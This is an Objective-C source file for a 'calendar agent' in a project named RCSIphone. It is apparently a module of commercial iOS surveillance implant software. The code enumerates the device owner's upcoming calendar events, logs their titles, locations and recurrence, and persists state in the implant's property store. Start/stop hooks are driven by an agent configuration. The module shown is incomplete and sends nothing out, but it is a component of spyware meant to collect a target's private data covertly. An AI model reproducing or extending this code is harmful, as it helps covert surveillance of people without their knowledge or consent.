//
//  RCSIAgentCalendar.m
//  RCSIphone
//
//  Created by kiodo on 04/08/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RCSIAgentCalendar.h"
#import "RCSICommon.h"
#import "EventKit.h"

static RCSIAgentCalendar *sharedAgentCalendar = nil;

@implementation RCSIAgentCalendar

- (BOOL)_setAgentMessagesProperty
{
  NSAutoreleasePool *pool   = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *eventDateDict = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithLong: mLastEvent], nil] 
                                                              forKeys: [NSArray arrayWithObjects: @"LAST_EVENT_DATE", nil]];
  
  NSDictionary *agentDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: eventDateDict, nil]
                                                              forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [eventDateDict release];
   
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentMessagesProperty
{
  NSDictionary *agentDict = nil;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  agentDict = rcsPropertyWithName([[self class] description]);
  
  if (agentDict == nil) 
  {
#ifdef DEBUG
    NSLog(@"%s: getting prop failed!", __FUNCTION__);
#endif
    return YES;
  }

  NSNumber *lastEventDate = (NSNumber*)[agentDict objectForKey: @"LAST_EVENT_DATE"];
  
  mLastEvent = [lastEventDate longValue];
  
  [outerPool release];
  
  return YES;
}

- (id)init
{
    self = [super init];
    if (self) {
        // Initialization code here.
    }
    
    return self;
}

- (NSArray*)getEvents: (NSDate*)startDate
               toDate: (NSDate*)endDate
{
  EKEventStore *eStore = [[EKEventStore alloc] init];
  
  NSPredicate *predicate = [eStore predicateForEventsWithStartDate:startDate endDate:endDate calendars:nil];
  
  NSArray *events = [eStore eventsMatchingPredicate: predicate];
  
  return events;
}

- (void)parseEvents
{
  NSDate *startDate, *endDate;
  UIDevice *device;
  
  device = [UIDevice currentDevice];
  
  NSString *majVer = [[device systemVersion] substringToIndex:1];
    
  if ([majVer compare: @"3"] == NSOrderedSame) 
  {
#ifdef DEBUG_TMP
    NSLog(@"%s: not supported iOS", __FUNCTION__);
#endif
    return;
  }
  
  startDate = [NSDate date];
  endDate   = [NSDate dateWithTimeIntervalSinceNow:1186400];
  
  NSArray *events = [self getEvents: startDate toDate: endDate];
  
  for (int i=0; i < [events count]; i++) 
  {
    EKEvent *currEvent = [events objectAtIndex: i];
    
#ifdef DEBUG_TMP  
    NSLog(@"%s: title %@, location %@", 
          __FUNCTION__,  
          [currEvent title], 
          [currEvent location]);
#endif
    
    EKRecurrenceRule *recRule = [currEvent recurrenceRule];
    
    if (recRule) 
    {
      switch([recRule frequency])
      {
        case EKRecurrenceFrequencyDaily:
#ifdef DEBUG_TMP 
          NSLog(@"%s: frequency daily", __FUNCTION__);
#endif
        break;
        case EKRecurrenceFrequencyWeekly:
#ifdef DEBUG_TMP 
          NSLog(@"%s: frequency weekly", __FUNCTION__);
#endif
        break;
        case EKRecurrenceFrequencyMonthly:
#ifdef DEBUG_TMP
          NSLog(@"%s: frequency Monthly", __FUNCTION__);
#endif
        break;
        case EKRecurrenceFrequencyYearly:
#ifdef DEBUG_TMP 
          NSLog(@"%s: frequency Yearly", __FUNCTION__);
#endif
        break;
      }
      
      NSLog(@"%s: interval %d", __FUNCTION__, [recRule interval]);      
    }
    
  } 
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_DEVICE
  NSLog(@"%s: Agent calendar started", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

    [innerPool release];
  }
  
  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= 5)
  {
    internalCounter++;
    sleep(1);
  }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
  {
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

+ (RCSIAgentCalendar *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentCalendar == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentCalendar;
}


@end
